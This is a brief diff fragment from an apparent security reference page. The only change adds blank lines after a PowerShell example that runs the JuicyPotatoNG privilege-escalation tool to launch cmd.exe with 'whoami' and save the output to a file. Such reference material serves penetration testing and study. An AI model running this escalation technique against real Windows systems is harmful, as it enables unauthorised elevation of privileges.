@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:34.803629+00:00'
 ```powershell
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
 ```
+
+
